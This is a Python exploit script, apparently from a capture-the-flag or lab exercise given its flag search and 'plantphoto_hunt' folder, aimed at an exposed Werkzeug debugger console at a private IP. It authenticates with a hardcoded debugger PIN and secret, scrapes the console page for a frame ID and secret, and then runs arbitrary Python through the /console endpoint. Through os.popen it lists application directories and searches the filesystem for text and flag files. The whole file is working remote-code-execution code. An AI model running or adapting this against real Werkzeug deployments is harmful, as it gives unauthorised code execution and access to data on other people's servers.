"""Execute commands via Werkzeug /console endpoint."""
import requests
import re
from urllib.parse import quote

T = "http://10.82.191.7"
SECRET = "sM6NrAKPszppdtL95Nl2"
PIN = "110-688-511"

session = requests.Session()

# Auth
r = session.get(f"{T}?__debugger__=yes&cmd=pinauth&pin={PIN}&s={SECRET}", timeout=10)
print(f"Auth: {r.text}")

# Get the console page to find the correct frame ID
r = session.get(f"{T}/console", timeout=10)
print(f"\nConsole page ({len(r.text)} bytes)")

# Extract frame and secret from console page
console_secrets = re.findall(r'SECRET\s*=\s*["\']([^"\']+)', r.text)
console_frames = re.findall(r'frm=(\d+)', r.text)
print(f"Console secrets: {console_secrets}")
print(f"Console frames: {console_frames}")

# Save console page
with open("plantphoto_hunt/console_page.html", "w", encoding="utf-8") as f:
    f.write(r.text)

# The /console endpoint uses a special frame ID for the interactive console
# Try executing through /console with __debugger__=yes
cmds = [
    "print('CANARY_12345')",
    "import os; print(os.listdir('/usr/src/app'))",
    "import os; print(__import__('os').popen('find / -name *.txt -type f 2>/dev/null').read())",
    "import os; print(__import__('os').popen('find / -name flag* -type f 2>/dev/null').read())",
    "import os; print(__import__('os').popen('ls -laR /usr/src/app/').read())",
]

# The secret on the console page might be different
secret = console_secrets[0] if console_secrets else SECRET

for cmd in cmds:
    url = f"{T}/console?__debugger__=yes&cmd={quote(cmd)}&frm=0&s={secret}"
    r = session.get(url, timeout=15)
    
    print(f"\n>>> {cmd}")
    print(f"  Status: {r.status_code}, CT: {r.headers.get('Content-Type','')}, Len: {len(r.text)}")
    
    # The Werkzeug console returns HTML with the output
    text = r.text
    if len(text) < 2000:
        # Strip HTML but keep text content
        clean = re.sub(r'<[^>]+>', '\n', text)
        lines = [l.strip() for l in clean.split('\n') if l.strip()]
        for line in lines:
            print(f"  {line}")
    else:
        # Larger response - look for output markers
        clean = re.sub(r'<[^>]+>', '\n', text)
        lines = [l.strip() for l in clean.split('\n') if l.strip()]
        for line in lines:
            if any(kw in line for kw in ['CANARY', '/usr', 'flag', '.txt', 'app.py', 'total']):
                print(f"  {line}")
